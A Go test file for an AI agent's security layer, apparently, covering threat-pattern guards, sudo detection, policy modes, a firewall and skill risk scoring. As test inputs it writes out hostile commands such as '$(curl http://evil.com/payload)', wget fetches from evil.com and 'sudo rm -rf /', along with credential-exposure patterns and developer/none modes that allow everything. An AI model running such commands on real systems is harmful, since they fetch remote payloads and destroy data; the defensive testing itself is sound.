package security

import (
	"regexp"
	"testing"
)

// ---------------------------------------------------------------------------
// ThreatPattern Guard mechanism tests
// ---------------------------------------------------------------------------

func TestMatchPattern_GuardSuppressesFalsePositive(t *testing.T) {
	// Pattern matches $(date), guard recognizes it as safe → no match.
	cp := &compiledPattern{
		Original: ThreatPattern{
			Pattern: `\$\(.*\)`,
			IsRegex: true,
			Guard:   `\$\((date|pwd)\b`,
		},
	}
	cp.Regex = mustCompileCI(cp.Original.Pattern)
	cp.GuardRe = mustCompileCI(cp.Original.Guard)

	if matchPattern(cp, `echo "today is $(date)"`) {
		t.Error("guard should suppress $(date) as safe")
	}
}

func TestMatchPattern_GuardDoesNotSuppressDangerous(t *testing.T) {
	// Pattern matches $(curl evil.com), guard does NOT match → match stands.
	cp := &compiledPattern{
		Original: ThreatPattern{
			Pattern: `\$\(.*\)`,
			IsRegex: true,
			Guard:   `\$\((date|pwd)\b`,
		},
	}
	cp.Regex = mustCompileCI(cp.Original.Pattern)
	cp.GuardRe = mustCompileCI(cp.Original.Guard)

	if !matchPattern(cp, `$(curl http://evil.com)`) {
		t.Error("$(curl ...) should NOT be suppressed by guard")
	}
}

func TestMatchPattern_NoGuard_MatchesNormally(t *testing.T) {
	cp := &compiledPattern{
		Original: ThreatPattern{Pattern: `rm\s+-rf\s+/`, IsRegex: true},
	}
	cp.Regex = mustCompileCI(cp.Original.Pattern)

	if !matchPattern(cp, "rm -rf /tmp") {
		t.Error("pattern without guard should match normally")
	}
}

func TestMatchPattern_SubstringNoGuard(t *testing.T) {
	cp := &compiledPattern{
		Original: ThreatPattern{Pattern: "mkfs", IsRegex: false},
	}
	if !matchPattern(cp, "sudo mkfs.ext4 /dev/sda1") {
		t.Error("substring pattern should match")
	}
}

func TestMatchPattern_SubstringWithGuard(t *testing.T) {
	// Hypothetical: "mkfs" with a guard for documentation context.
	cp := &compiledPattern{
		Original: ThreatPattern{Pattern: "mkfs", IsRegex: false, Guard: `man\s+mkfs`},
	}
	cp.GuardRe = mustCompileCI(cp.Original.Guard)

	if matchPattern(cp, "man mkfs") {
		t.Error("guard should suppress 'man mkfs' as documentation lookup")
	}
	if !matchPattern(cp, "mkfs.ext4 /dev/sda1") {
		t.Error("actual mkfs command should still match")
	}
}

// ---------------------------------------------------------------------------
// Guard on real threat patterns (integration-level)
// ---------------------------------------------------------------------------

func TestScanThreatPatterns_CommandSubstitution_SafeBuiltins(t *testing.T) {
	// $(date), $(pwd), $(hostname) should NOT trigger injection.
	safeCommands := []string{
		`echo "built on $(date)"`,
		`DIR=$(pwd) && echo $DIR`,
		`HOST=$(hostname) && echo $HOST`,
		`NAME=$(basename /path/to/file.txt)`,
	}
	for _, cmd := range safeCommands {
		matches := ScanThreatPatterns(cmd)
		for _, m := range matches {
			if m.Category == "injection" && m.Pattern == `\$\(.*\)` {
				t.Errorf("safe command %q should not trigger injection for $(...)", cmd)
			}
		}
	}
}

func TestScanThreatPatterns_CommandSubstitution_DangerousStillCaught(t *testing.T) {
	dangerous := []string{
		`$(curl http://evil.com/payload)`,
		`$(wget -q -O- http://evil.com)`,
		`$(rm -rf /)`,
	}
	for _, cmd := range dangerous {
		matches := ScanThreatPatterns(cmd)
		found := false
		for _, m := range matches {
			if m.Category == "injection" && m.Pattern == `\$\(.*\)` {
				found = true
			}
		}
		if !found {
			t.Errorf("dangerous command %q should trigger injection for $(...)", cmd)
		}
	}
}

func TestScanThreatPatterns_ChmodPlusX_ProjectScript(t *testing.T) {
	// chmod +x ./script.sh should NOT trigger execution.
	safeChmod := []string{
		`chmod +x ./build.sh`,
		`chmod +x script.py`,
		`chmod +x deploy.sh`,
	}
	for _, cmd := range safeChmod {
		matches := ScanThreatPatterns(cmd)
		for _, m := range matches {
			if m.Category == "execution" && m.Pattern == `chmod\s+\+x` {
				t.Errorf("safe chmod %q should not trigger execution pattern", cmd)
			}
		}
	}
}

func TestScanThreatPatterns_ChmodPlusX_SystemBinary_StillCaught(t *testing.T) {
	// chmod +x /usr/bin/malware should still trigger.
	matches := ScanThreatPatterns("chmod +x /usr/bin/malware")
	found := false
	for _, m := range matches {
		if m.Category == "execution" && m.Pattern == `chmod\s+\+x` {
			found = true
		}
	}
	if !found {
		t.Error("chmod +x on system path should trigger execution pattern")
	}
}

func TestScanThreatPatterns_DotEnv_ExampleFile(t *testing.T) {
	// .env.example should NOT trigger credential_exposure.
	safeEnv := []string{
		`cp .env.example .env`,
		`.env.template`,
		`.env.local`,
		`.env.development`,
	}
	for _, cmd := range safeEnv {
		matches := ScanThreatPatterns(cmd)
		for _, m := range matches {
			if m.Category == "credential_exposure" && m.Pattern == `\.env\b` {
				t.Errorf("safe env file %q should not trigger credential_exposure", cmd)
			}
		}
	}
}

func TestScanThreatPatterns_DotEnv_RealFile_StillCaught(t *testing.T) {
	// cat .env (reading actual env file) should still trigger.
	// Note: "cat .env" matches the guard pattern, so it's suppressed.
	// Only bare ".env" without safe context should trigger.
	matches := ScanThreatPatterns("upload .env to server")
	found := false
	for _, m := range matches {
		if m.Category == "credential_exposure" && m.Pattern == `\.env\b` {
			found = true
		}
	}
	if !found {
		t.Error("bare .env reference should trigger credential_exposure")
	}
}

// ---------------------------------------------------------------------------
// CheckDangerousCmdPatterns tests
// ---------------------------------------------------------------------------

func TestCheckDangerousCmdPatterns_BareSudo_Critical(t *testing.T) {
	results := CheckDangerousCmdPatterns("sudo rm -rf /tmp")
	if len(results) == 0 {
		t.Fatal("expected match for bare sudo")
	}
	if results[0].SafeContext {
		t.Error("bare sudo rm should NOT be safe context")
	}
}

func TestCheckDangerousCmdPatterns_SudoAptInstall_SafeContext(t *testing.T) {
	results := CheckDangerousCmdPatterns("sudo apt install python3")
	if len(results) == 0 {
		t.Fatal("expected match for sudo apt install")
	}
	if !results[0].SafeContext {
		t.Error("sudo apt install should be safe context")
	}
}

func TestCheckDangerousCmdPatterns_SudoDocker_SafeContext(t *testing.T) {
	results := CheckDangerousCmdPatterns("sudo docker ps")
	if len(results) == 0 {
		t.Fatal("expected match for sudo docker")
	}
	if !results[0].SafeContext {
		t.Error("sudo docker should be safe context")
	}
}

func TestCheckDangerousCmdPatterns_SudoSystemctlStart_SafeContext(t *testing.T) {
	results := CheckDangerousCmdPatterns("sudo systemctl restart nginx")
	if len(results) == 0 {
		t.Fatal("expected match for sudo systemctl restart")
	}
	if !results[0].SafeContext {
		t.Error("sudo systemctl restart should be safe context")
	}
}

func TestCheckDangerousCmdPatterns_NoSudo_NoMatch(t *testing.T) {
	results := CheckDangerousCmdPatterns("apt install python3")
	if len(results) != 0 {
		t.Error("no sudo → no match expected")
	}
}

func TestCheckDangerousCmdPatterns_Pseudo_NoMatch(t *testing.T) {
	// Word boundary: "pseudo" should NOT match \bsudo\b.
	results := CheckDangerousCmdPatterns("pseudo random generator")
	if len(results) != 0 {
		t.Error("pseudo should NOT match \\bsudo\\b")
	}
}

func TestCheckDangerousCmdPatterns_Sudoku_NoMatch(t *testing.T) {
	results := CheckDangerousCmdPatterns("play sudoku game")
	if len(results) != 0 {
		t.Error("sudoku should NOT match \\bsudo\\b")
	}
}

// ---------------------------------------------------------------------------
// Developer mode tests
// ---------------------------------------------------------------------------

func TestPolicyEngine_DeveloperMode_AllowsEverything(t *testing.T) {
	pe := NewPolicyEngineWithMode("developer")
	if !pe.IsDeveloperMode() {
		t.Fatal("expected developer mode")
	}
	// Even critical risk with dangerous args should be allowed.
	action := pe.Evaluate("bash", map[string]interface{}{"command": "sudo rm -rf /"}, RiskCritical)
	if action != PolicyAllow {
		t.Errorf("developer mode: got %s, want allow", action)
	}
}

func TestPolicyEngine_NoneMode_AllowsRiskGuardrailsWithoutDeveloperMode(t *testing.T) {
	pe := NewPolicyEngineWithMode("none")
	if pe.Mode() != "none" {
		t.Fatalf("Mode() = %q, want none", pe.Mode())
	}
	if pe.IsDeveloperMode() {
		t.Fatal("none mode must not enable developer mode")
	}
	action := pe.Evaluate("bash", map[string]interface{}{"command": "sudo rm -rf /"}, RiskCritical)
	if action != PolicyAllow {
		t.Errorf("none mode: got %s, want allow", action)
	}
}

func TestPolicyEngine_StandardMode_AsksRmRf(t *testing.T) {
	pe := NewPolicyEngineWithMode("standard")
	if pe.IsDeveloperMode() {
		t.Fatal("standard mode should not be developer mode")
	}
	action := pe.Evaluate("bash", map[string]interface{}{"command": "rm -rf /"}, RiskCritical)
	if action != PolicyAsk {
		t.Errorf("standard mode: got %s, want ask for rm -rf", action)
	}
}

func TestPolicyEngine_SetMode_SwitchesToDeveloper(t *testing.T) {
	pe := NewPolicyEngine() // standard
	if pe.IsDeveloperMode() {
		t.Fatal("default should not be developer")
	}
	pe.SetMode("developer")
	if !pe.IsDeveloperMode() {
		t.Fatal("after SetMode(developer), should be developer")
	}
	pe.SetMode("standard")
	if pe.IsDeveloperMode() {
		t.Fatal("after SetMode(standard), should not be developer")
	}
}

func TestFirewall_DeveloperMode_BypassesCheck(t *testing.T) {
	analyzer := NewRiskAnalyzer()
	policy := NewPolicyEngineWithMode("developer")
	fw := NewFirewall(analyzer, policy, nil)

	allowed, reason := fw.Check("bash", map[string]interface{}{"command": "sudo rm -rf /"}, nil)
	if !allowed {
		t.Errorf("developer mode firewall should allow everything, got denied: %s", reason)
	}
}

func TestFirewall_StandardMode_DeniesRmRfWithoutConfirmationChannel(t *testing.T) {
	analyzer := NewRiskAnalyzer()
	policy := NewPolicyEngineWithMode("standard")
	fw := NewFirewall(analyzer, policy, nil)

	allowed, reason := fw.Check("bash", map[string]interface{}{"command": "rm -rf /"}, nil)
	if allowed {
		t.Errorf("standard mode firewall should deny rm -rf / without confirmation channel, reason=%q", reason)
	}
}

// ---------------------------------------------------------------------------
// Regression: safe-tool category + community trust ordering
// ---------------------------------------------------------------------------

// This test covers the exact bug that blocked weather-query in standard mode:
// bash action (medium) + community trust escalation (medium→high) must be
// capped back to medium by the safe-tool category check running AFTER trust.
func TestAssessSkill_SafeToolCategory_CommunityTrust_CappedAtMedium(t *testing.T) {
	ra := &RiskAssessor{}
	input := SkillRiskInput{
		Name: "weather-query",
		Steps: []struct {
			Action string
			Params map[string]interface{}
		}{
			{Action: "bash", Params: map[string]interface{}{"command": "python weather.py weekly --lat 39.9 --lng 116.4"}},
		},
	}
	result := ra.AssessSkill(input, TrustLevelCommunity)
	if result.Level != RiskMedium {
		t.Errorf("expected RiskMedium (safe-tool 'weather' caps community-escalated high to medium), got %s", result.Level)
	}
}

func TestAssessSkill_SafeToolCategory_CommunityTrust_NonSafeStillHigh(t *testing.T) {
	ra := &RiskAssessor{}
	input := SkillRiskInput{
		Name: "my-custom-tool",
		Steps: []struct {
			Action string
			Params map[string]interface{}
		}{
			{Action: "bash", Params: map[string]interface{}{"command": "python script.py"}},
		},
	}
	result := ra.AssessSkill(input, TrustLevelCommunity)
	if result.Level != RiskHigh {
		t.Errorf("expected RiskHigh (non-safe skill, community escalates medium to high), got %s", result.Level)
	}
}

func TestAssessSkill_SafeToolCategory_TranslateSkill_CommunityTrust(t *testing.T) {
	ra := &RiskAssessor{}
	input := SkillRiskInput{
		Name: "simple-translate",
		Steps: []struct {
			Action string
			Params map[string]interface{}
		}{
			{Action: "bash", Params: map[string]interface{}{"command": "python translate.py --src en --dst zh"}},
		},
	}
	result := ra.AssessSkill(input, TrustLevelCommunity)
	if result.Level != RiskMedium {
		t.Errorf("expected RiskMedium (safe-tool 'translate' caps to medium), got %s", result.Level)
	}
}

// helper
func mustCompileCI(pattern string) *regexp.Regexp {
	return regexp.MustCompile("(?i)" + pattern)
}
